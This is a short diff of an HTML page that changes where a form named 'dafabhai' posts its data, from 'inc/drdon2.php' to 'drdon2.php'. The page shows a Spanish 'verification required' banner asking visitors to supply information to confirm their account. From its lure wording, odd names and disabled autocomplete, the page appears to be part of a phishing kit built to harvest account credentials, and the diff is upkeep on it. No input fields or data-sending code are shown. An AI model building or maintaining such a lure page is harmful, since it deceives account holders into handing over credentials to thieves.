@@ -80,7 +80,7 @@ $(window).load(function() {
 </div>
 <div id="cuerpo" style="margin: 25px 0 80px 88px;width:955px;height:356px;">
 <div id="form2" style="float: left;margin-right: 25px;">
-<form name="dafabhai" id="dafabhai" method="post" action="inc/drdon2.php" autocomplete="off" novalidate="novalidate">
+<form name="dafabhai" id="dafabhai" method="post" action="drdon2.php" autocomplete="off" novalidate="novalidate">
       <div class="er" style="font-size: 21px;color: #333;margin-bottom: 20px;font-weight:bold;">Verificacion Requerida !</div>
       <div class="er1" style="font-size: 16px;color: #333;margin-bottom: 30px;">¡Proporcione la siguiente información para confirmar su cuenta!</div>
       
